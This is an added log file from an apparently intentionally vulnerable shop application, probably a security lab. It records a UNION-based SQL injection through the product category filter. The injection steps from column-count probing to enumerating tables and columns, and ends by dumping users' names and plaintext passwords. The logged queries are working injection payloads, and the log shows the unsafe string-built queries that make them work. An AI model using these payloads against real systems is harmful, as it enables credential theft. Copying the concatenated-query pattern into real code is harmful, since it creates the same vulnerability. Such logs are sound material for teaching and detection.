@@ -1,0 +1,54 @@
+INFO:SQL_fetch:Wed Sep 23 18:23:51 2026 : Executed SQL query: SELECT DISTINCT category FROM products where released = TRUE ORDER BY category
+INFO:SQL_fetch:Wed Sep 23 18:23:51 2026 : Fetched data: [('Books',), ('Computers',), ('Electronics',), ('Kitchen',), ('Sports',)]
+INFO:SQL_fetch:Wed Sep 23 18:23:51 2026 : Executed SQL query: SELECT name, price FROM products where released = TRUE and category = 'Kitchen'
+INFO:SQL_fetch:Wed Sep 23 18:23:51 2026 : Fetched data: [('Coffee mug', 12.5), ('Knife', 39.99), ('Blender', 59.99), ('Pan', 44.5), ('Forks set', 24.99)]
+INFO:SQL_fetch:Wed Sep 23 18:23:53 2026 : Executed SQL query: SELECT DISTINCT category FROM products where released = TRUE ORDER BY category
+INFO:SQL_fetch:Wed Sep 23 18:23:53 2026 : Fetched data: [('Books',), ('Computers',), ('Electronics',), ('Kitchen',), ('Sports',)]
+INFO:SQL_fetch:Wed Sep 23 18:23:53 2026 : Executed SQL query: SELECT name, price FROM products where released = TRUE and category = 'Computers'
+INFO:SQL_fetch:Wed Sep 23 18:23:53 2026 : Fetched data: [('Keyboard', 49.99)]
+INFO:SQL_fetch:Wed Sep 23 18:24:02 2026 : Executed SQL query: SELECT DISTINCT category FROM products where released = TRUE ORDER BY category
+INFO:SQL_fetch:Wed Sep 23 18:24:02 2026 : Fetched data: [('Books',), ('Computers',), ('Electronics',), ('Kitchen',), ('Sports',)]
+ERROR:SQL_fetch:Wed Sep 23 18:24:02 2026 : unterminated quoted string at or near "'"
+LINE 1: ...eleased = TRUE and category = 'Computers' union select null'
+                                                                      ^
+INFO:SQL_fetch:Wed Sep 23 18:24:14 2026 : Executed SQL query: SELECT DISTINCT category FROM products where released = TRUE ORDER BY category
+INFO:SQL_fetch:Wed Sep 23 18:24:14 2026 : Fetched data: [('Books',), ('Computers',), ('Electronics',), ('Kitchen',), ('Sports',)]
+INFO:SQL_fetch:Wed Sep 23 18:24:14 2026 : Executed SQL query: SELECT name, price FROM products where released = TRUE and category = 'Computers' union select null,null--'
+INFO:SQL_fetch:Wed Sep 23 18:24:14 2026 : Fetched data: [('Keyboard', 49.99), (None, None)]
+INFO:SQL_fetch:Wed Sep 23 18:24:32 2026 : Executed SQL query: SELECT DISTINCT category FROM products where released = TRUE ORDER BY category
+INFO:SQL_fetch:Wed Sep 23 18:24:32 2026 : Fetched data: [('Books',), ('Computers',), ('Electronics',), ('Kitchen',), ('Sports',)]
+INFO:SQL_fetch:Wed Sep 23 18:24:32 2026 : Executed SQL query: SELECT name, price FROM products where released = TRUE and category = 'Computers' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='public'--'
+INFO:SQL_fetch:Wed Sep 23 18:24:32 2026 : Fetched data: [('sessions', None), ('Keyboard', 49.99), ('products', None), ('users', None)]
+INFO:SQL_fetch:Wed Sep 23 18:27:21 2026 : Executed SQL query: SELECT DISTINCT category FROM products where released = TRUE ORDER BY category
+INFO:SQL_fetch:Wed Sep 23 18:27:21 2026 : Fetched data: [('Books',), ('Computers',), ('Electronics',), ('Kitchen',), ('Sports',)]
+INFO:SQL_fetch:Wed Sep 23 18:27:21 2026 : Executed SQL query: SELECT name, price FROM products where released = TRUE
+INFO:SQL_fetch:Wed Sep 23 18:27:21 2026 : Fetched data: [('Keyboard', 49.99), ('Coffee mug', 12.5), ('Wireless headphones', 79.99), ('Smartphone', 699.0), ('USB-C hub', 34.5), ('Knife', 39.99), ('Blender', 59.99), ('Pan', 44.5), ('Forks set', 24.99), ('Yoga mat', 29.99), ('Running shoes', 89.99), ('Dumbbells', 129.99), ('Blackhat python', 10.99), ('The hitchhiker`s guide to the galaxy', 42.0), ('Android Hacker`s handbook', 39.99), ('Introduction to Algorithms', 89.99)]
+INFO:SQL_fetch:Wed Sep 23 18:27:23 2026 : Executed SQL query: SELECT DISTINCT category FROM products where released = TRUE ORDER BY category
+INFO:SQL_fetch:Wed Sep 23 18:27:23 2026 : Fetched data: [('Books',), ('Computers',), ('Electronics',), ('Kitchen',), ('Sports',)]
+INFO:SQL_fetch:Wed Sep 23 18:27:23 2026 : Executed SQL query: SELECT name, price FROM products where released = TRUE and category = 'Computers'
+INFO:SQL_fetch:Wed Sep 23 18:27:23 2026 : Fetched data: [('Keyboard', 49.99)]
+INFO:SQL_fetch:Wed Sep 23 18:27:35 2026 : Executed SQL query: SELECT DISTINCT category FROM products where released = TRUE ORDER BY category
+INFO:SQL_fetch:Wed Sep 23 18:27:35 2026 : Fetched data: [('Books',), ('Computers',), ('Electronics',), ('Kitchen',), ('Sports',)]
+INFO:SQL_fetch:Wed Sep 23 18:27:35 2026 : Executed SQL query: SELECT name, price FROM products where released = TRUE and category = 'Computers' union select null,null--'
+INFO:SQL_fetch:Wed Sep 23 18:27:35 2026 : Fetched data: [('Keyboard', 49.99), (None, None)]
+INFO:SQL_fetch:Wed Sep 23 18:29:01 2026 : Executed SQL query: SELECT DISTINCT category FROM products where released = TRUE ORDER BY category
+INFO:SQL_fetch:Wed Sep 23 18:29:01 2026 : Fetched data: [('Books',), ('Computers',), ('Electronics',), ('Kitchen',), ('Sports',)]
+ERROR:SQL_fetch:Wed Sep 23 18:29:01 2026 : each UNION query must have the same number of columns
+LINE 1: ...eased = TRUE and category = 'Computers' union select null--'
+                                                                ^
+INFO:SQL_fetch:Wed Sep 23 18:30:14 2026 : Executed SQL query: SELECT DISTINCT category FROM products where released = TRUE ORDER BY category
+INFO:SQL_fetch:Wed Sep 23 18:30:14 2026 : Fetched data: [('Books',), ('Computers',), ('Electronics',), ('Kitchen',), ('Sports',)]
+INFO:SQL_fetch:Wed Sep 23 18:30:14 2026 : Executed SQL query: SELECT name, price FROM products where released = TRUE and category = 'Computers' union select 'a',42--'
+INFO:SQL_fetch:Wed Sep 23 18:30:14 2026 : Fetched data: [('Keyboard', 49.99), ('a', 42.0)]
+INFO:SQL_fetch:Wed Sep 23 18:33:49 2026 : Executed SQL query: SELECT DISTINCT category FROM products where released = TRUE ORDER BY category
+INFO:SQL_fetch:Wed Sep 23 18:33:49 2026 : Fetched data: [('Books',), ('Computers',), ('Electronics',), ('Kitchen',), ('Sports',)]
+INFO:SQL_fetch:Wed Sep 23 18:33:49 2026 : Executed SQL query: SELECT name, price FROM products where released = TRUE and category = 'Computers' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='[users]'--'
+INFO:SQL_fetch:Wed Sep 23 18:33:49 2026 : Fetched data: [('Keyboard', 49.99)]
+INFO:SQL_fetch:Wed Sep 23 18:34:02 2026 : Executed SQL query: SELECT DISTINCT category FROM products where released = TRUE ORDER BY category
+INFO:SQL_fetch:Wed Sep 23 18:34:02 2026 : Fetched data: [('Books',), ('Computers',), ('Electronics',), ('Kitchen',), ('Sports',)]
+INFO:SQL_fetch:Wed Sep 23 18:34:02 2026 : Executed SQL query: SELECT name, price FROM products where released = TRUE and category = 'Computers' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--'
+INFO:SQL_fetch:Wed Sep 23 18:34:02 2026 : Fetched data: [('Keyboard', 49.99), ('name', None), ('password', None), ('id', None)]
+INFO:SQL_fetch:Wed Sep 23 18:38:14 2026 : Executed SQL query: SELECT DISTINCT category FROM products where released = TRUE ORDER BY category
+INFO:SQL_fetch:Wed Sep 23 18:38:14 2026 : Fetched data: [('Books',), ('Computers',), ('Electronics',), ('Kitchen',), ('Sports',)]
+INFO:SQL_fetch:Wed Sep 23 18:38:14 2026 : Executed SQL query: SELECT name, price FROM products where released = TRUE and category = 'Computers' UNION SELECT name||'~'||password,NULL FROM users--'
+INFO:SQL_fetch:Wed Sep 23 18:38:14 2026 : Fetched data: [('Keyboard', 49.99), ('test~test', None), ('admin~admin', None), ('bob~secret', None), ('alice~password', None)]
